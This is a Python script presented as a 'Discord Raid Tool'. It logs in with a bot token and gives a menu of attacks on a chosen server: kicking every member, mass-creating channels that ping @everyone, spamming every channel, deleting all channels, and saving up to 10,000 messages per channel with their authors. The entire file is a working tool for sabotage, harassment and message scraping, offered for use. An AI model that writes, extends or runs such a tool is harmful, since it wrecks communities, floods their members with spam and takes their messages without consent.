import discord, time, threading, subprocess, os

BLUE = "\33[94m"
RED = "\33[91m"
GREEN = "\33[92m"
RESET = "\33[0m"
YELLOW = "\33[33m"

os.system("cls")
bot = discord.Client(self_bot=False)
banner = GREEN + """
___      _    _   _____         _ 
| _ \__ _(_)__| | |_   _|__  ___| |
|   / _` | / _` |   | |/ _ \/ _ \ |
|_|_\__,_|_\__,_|   |_|\___/\___/_|
                                    
""" + RESET
print(banner)
time.sleep(0.4)
print(f"{BLUE} Discord Raid Tool {YELLOW} | Snikker#6211 {RESET}")
print("")
time.sleep(0.4)

@bot.event
async def on_ready():
    print(f"{GREEN} [LOGGED IN] {BLUE} {bot.user.name}")
    print("")
    counter = -1
    guilds = []
    for guild in bot.guilds:
        counter += 1
        print(f"{RED} [{counter}] {GREEN} [LOADED] {BLUE} [{guild}]")
        guilds.append(guild)
    print("")
    guild = guilds[int(input(f"{BLUE} [SELECT SERVER]: {RESET}"))]
    os.system("cls")
    time.sleep(1)
    print(f"{RED} [0] {BLUE} Kick All Members ")
    print(f"{RED} [1] {BLUE} Show All Members ")
    print(f"{RED} [2] {BLUE} Channel Creator ")
    print(f"{RED} [3] {BLUE} Text Spammer ")
    print(f"{RED} [4] {BLUE} Channel Remover ")
    print(f"{RED} [5] {BLUE} Download Messages ")
    print("")
    attack = int(input(f"{BLUE} [SELECT ATTACK]: {RESET}"))
    if attack == 0:
        time.sleep(0.5)
        print("")
        guild = bot.get_guild(guild.id)
        counter = -1
        for member in guild.members:
            counter += 1
            try:
                await member.kick()
                print(f"{GREEN} [{counter}] [KICKED] [{member}]")
            except:
                print(f"{RED} [{counter}] [COULD NOT KICK] [{member}]")
                pass
        print("")
        input(f"{BLUE} [ALL MEMBERS KICKED] {RESET}")
        print("")
        os._exit(0)
    elif attack == 1:
        time.sleep(0.5)
        print("")
        guild = bot.get_guild(guild.id)
        counter = -1
        for member in guild.members:
            counter += 1
            print(f"{RED} [{counter}] {BLUE} [{member}]")
        print("")
        input(f"{BLUE} [LISTED ALL MEMBERS] {RESET}")
        print("")
        os._exit(0)
    elif attack == 2:
        channel_name = input(f"{BLUE} [ENTER CHANNEL NAME]: {RESET}")
        amount = int(input(f"{BLUE} [ENTER BOTS]: {RESET}"))
        time.sleep(0.5)
        print("")
        guild = bot.get_guild(guild.id)
        counter = -1
        for i in range(amount):
            thread = threading.Thread()
            thread.start()
            try:
                channel = await guild.create_text_channel(channel_name)
                await channel.send("@everyone")
                counter += 1
                print(f"{RED} [{counter}] {GREEN} [CREATED] {BLUE} [{channel_name}]")
            except:
                pass
        thread.join()
        print("")
        input(f"{BLUE} [CHANNELS CREATED] {RESET}")
        print("")
        os._exit(0)
    elif attack == 3:
        spam_message = input(f"{BLUE} [ENTER SPAM MESSAGE]: {RESET}")
        amount = int(input(f"{BLUE} [ENTER BOTS]: {RESET}"))
        time.sleep(0.5)
        print("")
        guild = bot.get_guild(guild.id)
        counter = -1
        for i in range(amount):
            thread = threading.Thread()
            thread.start()
            try:
                for channel in guild.text_channels:
                    await channel.send(spam_message)
                    counter += 1
                    print(f"{RED} [{counter}] {GREEN} [MESSAGE SENT] {BLUE} [{channel}]")
            except:
                pass
        thread.join()
        print("")
        input(f"{BLUE} [MESSAGES SENT] {RESET}")
        print("")
        os._exit(0)
    elif attack == 4:
        time.sleep(0.5)
        print("")
        guild = bot.get_guild(guild.id)
        counter = -1
        for channel in guild.text_channels:
            try:
                await channel.delete()
                counter += 1
                print(f"{RED} [{counter}] {GREEN} [CHANNEL DELETED] {BLUE} [{channel}]")
            except:
                pass
        print("")
        input(f"{BLUE} [CHANNELS DELETED] {RESET}")
        print("")
        os._exit(0)
    elif attack == 5:
        time.sleep(0.5)
        print("")
        guild = bot.get_guild(guild.id)
        counter = -1
        if os.path.exists(f"{os.getcwd()}\\history\\{guild}") == False:
            subprocess.check_output(f'mkdir "{os.getcwd()}\\history\\{guild}"', shell=True)
        for channel in guild.text_channels:
            try:
                f = open(f"{os.getcwd()}\\history\\{guild}\\{channel.name}.txt", "a", encoding="utf-8")
            except:
                f = open(f"{os.getcwd()}\\history\\{guild}\\{channel.name}.txt", "a", encoding="utf-8")
                pass
            async for message in channel.history(limit=10000):
                counter += 1
                try:
                    f.write(f"Content: {message.content}\nAuthor: {message.author}\n\n")
                except:
                    f.write(f"Content: {message.content}\nAuthor: {message.author.id}\n\n")
                print(f"{RED} [{counter}] {GREEN} [MESSAGE SAVED] {BLUE} [{message.author}] [{message.channel.id}]")
            f.close()
        print("")
        input(f"{BLUE} [DOWNLOADED HISTORY] {RESET}")
        print("")
        os._exit(0)
try:
    bot.run(input(f"{BLUE} [Enter Bot Token]: {RESET}"))
except:
    print(f"{RED} [ERROR] {RESET} Token Invalid")